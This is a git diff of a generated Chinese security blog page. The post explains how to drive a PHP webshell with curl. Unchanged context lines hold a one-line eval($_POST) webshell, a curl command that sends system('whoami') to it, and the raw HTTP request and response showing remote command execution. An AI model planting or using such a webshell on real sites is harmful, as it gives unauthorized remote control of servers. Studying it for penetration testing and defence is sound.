@@ -96,16 +96,16 @@
         <p><a target="_blank" rel="noopener" href="https://curl.se/">curl工具</a>包含多种功能,其中可以进行调试网站接口,通过渗透测试上传的webshell可以理解为网站的远程调试及控制接口,因为webshell其特殊性,攻击者可以利用其特性对网站远程命令执行.(如果你想用postman等工具,我也拦不住你. 实际上还有专业的webshell管理工具,如某拉、某蝎、某剑、上古时期的某刀,自己写一个也没问题毕竟武器化自定义是最好的选择)</p>
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://8.8.8.8/shell.php -X POST -d <span class="string">&quot;pass=system(&quot;</span><span class="built_in">whoami</span><span class="string">&quot;);&quot;</span></span><br></pre></td></tr></table></figure>
 <h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h4 id="注-如下为最简单的php一句话webshell木马-将其放置在网站可解析php目录下既可以利用上传的webshell实现对网站远程命令执行-如下两种写法-皆可使用"><a href="#注-如下为最简单的php一句话webshell木马-将其放置在网站可解析php目录下既可以利用上传的webshell实现对网站远程命令执行-如下两种写法-皆可使用" class="headerlink" title="注: 如下为最简单的php一句话webshell木马,将其放置在网站可解析php目录下既可以利用上传的webshell实现对网站远程命令执行.(如下两种写法,皆可使用)"></a>注: 如下为最简单的php一句话webshell木马,将其放置在网站可解析php目录下既可以利用上传的webshell实现对网站远程命令执行.(如下两种写法,皆可使用)</h4><h4 id="eval-主要webshell执行命令时用到的功能函数-可以把传入字符串作为PHP代码执行"><a href="#eval-主要webshell执行命令时用到的功能函数-可以把传入字符串作为PHP代码执行" class="headerlink" title="eval(): 主要webshell执行命令时用到的功能函数,可以把传入字符串作为PHP代码执行;"></a>eval(): 主要webshell执行命令时用到的<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.eval.php">功能函数</a>,可以把传入字符串作为PHP代码执行;</h4><h4 id="POST-实现POST方法向eval-函数传入字符串的变量-让eval加以利用"><a href="#POST-实现POST方法向eval-函数传入字符串的变量-让eval加以利用" class="headerlink" title="$_POST(): 实现POST方法向eval()函数传入字符串的变量,让eval加以利用;"></a>$_POST(): 实现POST方法向eval()函数传入字符串的<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/reserved.variables.post.php">变量</a>,让eval加以利用;</h4><h4 id="pass-POST-所需要的值赋为希望系统执行的php命令-俗称webshell密码"><a href="#pass-POST-所需要的值赋为希望系统执行的php命令-俗称webshell密码" class="headerlink" title="pass: $_POST()所需要的值赋为希望系统执行的php命令,俗称webshell密码."></a>pass: $_POST()所需要的值赋为希望系统执行的php命令,俗称webshell密码.</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="调用木马过程"><a href="#调用木马过程" class="headerlink" title="调用木马过程"></a>调用木马过程</h2><h4 id="1、将pass的值赋为需要执行的命令"><a href="#1、将pass的值赋为需要执行的命令" class="headerlink" title="1、将pass的值赋为需要执行的命令;"></a>1、将pass的值赋为需要执行的命令;</h4><h4 id="2、将pass的请求值-request-发送给服务器"><a href="#2、将pass的请求值-request-发送给服务器" class="headerlink" title="2、将pass的请求值(request)发送给服务器;"></a>2、将pass的请求值(request)发送给服务器;</h4><p>请求数据包:</p>
+<h2 id="调用木马过程"><a href="#调用木马过程" class="headerlink" title="调用木马过程"></a>调用木马过程</h2><h4 id="1、将pass的值赋为需要执行的命令"><a href="#1、将pass的值赋为需要执行的命令" class="headerlink" title="1、将pass的值赋为需要执行的命令;"></a>1、将pass的值赋为需要执行的命令;</h4><h4 id="2、将pass的请求值-request-发送给服务器"><a href="#2、将pass的请求值-request-发送给服务器" class="headerlink" title="2、将pass的请求值(request)发送给服务器;"></a>2、将pass的请求值(request)发送给服务器;</h4><p>请求数据包(RAW格式):</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /shell.php HTTP/1.1</span><br><span class="line">Host: 8.8.8.8:8080</span><br><span class="line">User-Agent: curl/7.79.1</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 20</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">pass=system(whoami);</span><br></pre></td></tr></table></figure>
-<h4 id="3、将响应值-response-返给客户端-最终实现对网站远程命令执行"><a href="#3、将响应值-response-返给客户端-最终实现对网站远程命令执行" class="headerlink" title="3、将响应值(response)返给客户端,最终实现对网站远程命令执行;"></a>3、将响应值(response)返给客户端,最终实现对网站远程命令执行;</h4><p>响应数据包:</p>
+<h4 id="3、将响应值-response-返给客户端-最终实现对网站远程命令执行"><a href="#3、将响应值-response-返给客户端-最终实现对网站远程命令执行" class="headerlink" title="3、将响应值(response)返给客户端,最终实现对网站远程命令执行;"></a>3、将响应值(response)返给客户端,最终实现对网站远程命令执行;</h4><p>响应数据包(RAW格式):</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sun, 06 Nov 2022 07:48:40 GMT</span><br><span class="line">Server: Apache/2.4.10 (Debian)</span><br><span class="line">X-Powered-By: PHP/5.5.38</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">www-data.</span><br></pre></td></tr></table></figure>
 <h2 id="留言区"><a href="#留言区" class="headerlink" title="留言区"></a>留言区</h2><p>TODO</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/06/curl%E5%B7%A5%E5%85%B7%E8%BF%9E%E6%8E%A5webshell%E8%B0%83%E8%AF%95/" data-id="cla53jp2b00017thf7so1arbp" data-title="curl工具连接webshell调试" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/06/curl%E5%B7%A5%E5%85%B7%E8%BF%9E%E6%8E%A5webshell%E8%B0%83%E8%AF%95/" data-id="cla54mcks0002dvhfch1b0lfw" data-title="curl工具连接webshell调试" class="article-share-link">Share</a>
       
       
       
@@ -144,7 +144,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/06/Shiro-550%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/" data-id="cla53jp2900007thfdte5d85d" data-title="Shiro-550原理分析及利用" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/06/Shiro-550%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/" data-id="cla54mcko0000dvhfaeeg7o2e" data-title="Shiro-550原理分析及利用" class="article-share-link">Share</a>
       
       
       
@@ -195,7 +195,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/06/hello-world/" data-id="cla53jp2c00027thffhsw2au3" data-title="Hello World" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/06/hello-world/" data-id="cla54mckr0001dvhfdt8c14fw" data-title="Hello World" class="article-share-link">Share</a>
       
       
       
